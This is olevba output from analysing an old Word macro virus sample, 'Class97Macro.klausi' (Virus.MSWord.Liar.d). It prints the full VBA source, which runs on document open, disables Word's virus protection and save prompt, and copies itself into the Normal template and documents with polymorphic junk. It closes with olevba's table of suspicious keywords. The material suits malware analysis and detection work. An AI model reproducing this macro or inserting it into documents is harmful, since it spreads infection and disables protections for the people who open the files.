olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Liar.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Liar.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Rem Name:   Class97Macro.klausi
Rem Author: inspector klausi
Rem Date:   August 1999
--------------------------->


Private Sub DOCUMenT_OPEN() '
Dim v(175): Options.VirusProtection = (Rnd * 0): Options.SaveNormalPrompt = (Rnd * 0) '
Set A = MacroContainer.VBProject: Set Ab = A.VBcOmponEnts(1) '
Set ABc = Ab.coDEMoDUle: Set S = NormalTemplate: T = Chr(39) '
If MacroContainer = S Then Set S = ActiveDocument '
Set NH = S.VBProject.VBcOmponEnts(1).coDEMoDUle: Li = ABc.cOUntofliNEs: Y = 100 + Int(Rnd * 50) '
For i = 1 To Li: jc = "": d = Int(Rnd * 3): P = InStr(ABc.LInES(i, 1), T) '
If P = 1 And Li > Y Then '
d = 1: GoTo N_ '
End If '
l = UCase(Left(ABc.LInES(i, 1), (P - 1))) '
For O = 1 To Len(l): F = Mid(l, O, 1) '
If Asc(F) < 90 And Asc(F) > 65 Then F = Chr(Asc(F) + Int(Rnd * 2) * 32) '
v(i) = v(i) & F: Next O '
For J = 1 To Int(75 - (Rnd * 20)): jc = jc & Chr(255 - Int(Rnd * 100)): Next J '
v(i) = v(i) & T & jc '
If d = 2 Then v(i) = v(i) & vbCr & T & jc '
vc = vc & v(i) & vbCr '
N_: '
Next i '
If NH.cOUntofliNEs < (1 + 1 + 2) Then '
NH.dELeTelINES 1, NH.cOUntofliNEs: NH.AdDFrOMSTRiNg vc: NH.dELeTelINES NH.cOUntofliNEs, 1 '
With Dialogs(wdDialogFileSummaryInfo): .Author = "INsPECtor klAUsI": .Title = "INfEcted wItH clAss97MAcRo.kLAuSi": .Execute: End With '
If ActiveDocument.Saved = (Rnd * 0) Then ActiveDocument.SaveAs ActiveDocument.FullName '
End If '
End Sub '
Rem cODed by iNspector kLAUSi '

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |DOCUMenT_OPEN       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBcOmponEnts        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|coDEMoDUle          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AdDFrOMSTRiNg       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

